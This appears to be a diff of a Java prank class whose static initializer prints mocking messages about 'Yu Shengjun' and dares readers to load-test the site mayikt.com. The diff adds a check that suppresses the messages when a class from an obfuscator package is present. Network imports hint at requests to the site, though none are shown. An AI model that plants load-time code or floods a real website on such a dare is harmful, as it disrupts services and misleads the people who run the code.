@@ -1,15 +1,28 @@
 package com.mayikt.yushengjun;
 
+import pers.XiaoShadiao.obfuscator.Main;
+
 import java.io.InputStream;
 import java.net.URL;
 import java.net.URLConnection;
+import java.security.CodeSource;
+import java.security.ProtectionDomain;
+import java.util.Optional;
 import java.util.Random;
 
 public class YuShengJun {
 
     static {
-        System.out.println("我是Java之父余胜军, 我是最厉害的, 万类之父Object都要继承我");
-        System.out.println("我的网站反压测比Mircosoft还要牛逼, 火速来压测我的网站 XDD");
+        boolean flag = false;
+        try {
+            flag = Optional.ofNullable(Main.class.getProtectionDomain()).map(ProtectionDomain::getCodeSource).map(CodeSource::getLocation).map(URL::getPath).isPresent();
+        } catch(Throwable ignored) {
+
+        }
+        if (!flag) {
+            System.out.println("我是Java之父余胜军, 我是最厉害的, 万类之父Object都要继承我");
+            System.out.println("我的网站反压测比Mircosoft还要牛逼, 火速来压测我的网站 XDD");
+        }
     }
     public static final String website = "https://www.mayikt.com";
     public static final int tk = new Random().nextInt();
